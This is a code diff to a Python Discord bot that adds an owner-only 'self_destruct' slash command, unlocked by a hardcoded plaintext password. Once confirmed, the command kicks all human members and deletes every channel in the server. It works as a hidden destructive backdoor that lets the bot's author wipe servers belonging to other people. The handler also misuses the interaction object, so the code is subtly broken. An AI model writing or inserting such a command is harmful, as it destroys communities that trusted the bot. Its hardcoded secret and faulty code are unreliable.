@@ -10,6 +10,7 @@ import requests
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 
 OWNER_ID = 486652069831376943  # Your Discord user ID
+SELF_DESTRUCT_PASSWORD = "cobra@96"
 
 intents = discord.Intents.default()
 intents.members = True
@@ -346,6 +347,45 @@ async def color(interaction: discord.Interaction, hex: str):
     embed = discord.Embed(title=f"Color {hex}", description=f"Here is the color for {hex}", color=int(hex[1:], 16))
     embed.set_thumbnail(url=f"https://singlecolorimage.com/get/{hex[1:]}/400x400")
     await interaction.response.send_message(embed=embed, ephemeral=True)
+
+@bot.tree.command(name="self_destruct", description="Kick all users and delete all channels (Bot owner only with password)")
+async def self_destruct(ctx, *, password: str):
+    if ctx.author.id != 486652069831376943:  # Check if the user is the specified user
+        await ctx.send("You do not have permission to use this command.")
+        return
+
+    # Check if the command is invoked in a guild
+    if ctx.guild is None:
+        await ctx.send("This command can only be used in a server.")
+        return
+
+    if password != SELF_DESTRUCT_PASSWORD:  # Check password
+        await ctx.send("Incorrect password.")
+        return
+
+    # Confirm the command
+    await ctx.send("Are you sure you want to self-destruct the server? This action cannot be undone. Type 'yes' to confirm.")
+
+    def check(m):
+        return m.author == ctx.author and m.content.lower() == 'yes'
+
+    try:
+        confirmation = await bot.wait_for('message', check=check, timeout=30)
+        if confirmation:
+            # Kick all users in the server
+            for member in ctx.guild.members:
+                if member != ctx.author and not member.bot:
+                    await member.kick(reason="Server self-destruction initiated by the bot owner.")
+
+            # Delete all channels in the server
+            for channel in ctx.guild.channels:
+                await channel.delete(reason="Server self-destruction initiated by the bot owner.")
+
+            await ctx.send("Server self-destruction complete.")
+    except asyncio.TimeoutError:
+        await ctx.send("Self-destruction command timed out.")
+
+
 
 # Add your token at the end to run the bot
 bot.run(DISCORD_BOT_TOKEN)
